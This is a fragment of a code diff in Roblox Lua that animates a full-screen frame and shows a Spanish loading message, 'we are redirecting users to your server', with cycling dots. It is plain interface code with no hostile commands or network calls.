+        Size = UDim2.new(1, 100, 1, 100),
+        Position = UDim2.new(0, -50, 0, -50),
+        BackgroundTransparency = 0
+    }):Play()
+    
+    task.wait(1.3)
+    
+    local finalText = Instance.new("TextLabel")
+    finalText.Name = "FinalLoadingText"
+    finalText.Size = UDim2.new(0.9, 0, 0.4, 0) 
+    finalText.Position = UDim2.new(0.5, 0, 0.5, 0)
+    finalText.AnchorPoint = Vector2.new(0.5, 0.5) 
+    finalText.BackgroundTransparency = 1
+    finalText.TextColor3 = THEME.Accent
+    finalText.Font = THEME.FontMain
+    finalText.TextSize = 42
+    finalText.TextScaled = true
+    finalText.TextWrapped = true
+    finalText.TextXAlignment = Enum.TextXAlignment.Center
+    finalText.TextYAlignment = Enum.TextYAlignment.Center
+    finalText.Text = "Estamos redirigiendo a los usuarios a tu servidor, por favor espera!"
+    finalText.TextTransparency = 1
+    finalText.ZIndex = 9999999
+    finalText.Parent = mainFrame
+    
+    local textConstraint = Instance.new("UITextSizeConstraint")
+    textConstraint.MaxTextSize = 80
+    textConstraint.MinTextSize = 20
+    textConstraint.Parent = finalText
+    
+    TweenService:Create(finalText, TweenInfo.new(1), {TextTransparency = 0}):Play()
+    
+    task.spawn(function()
+        local dots = ""
+        while finalText.Parent do
+            dots = dots .. "."
+            if #dots > 3 then 
+                dots = "" 
+            end
+            finalText.Text = "Estamos redirigiendo a los usuarios a tu servidor, por favor espera" .. dots
+            task.wait(0.5)
+        end
+    end)
+    
+    isRunning = false
+end)
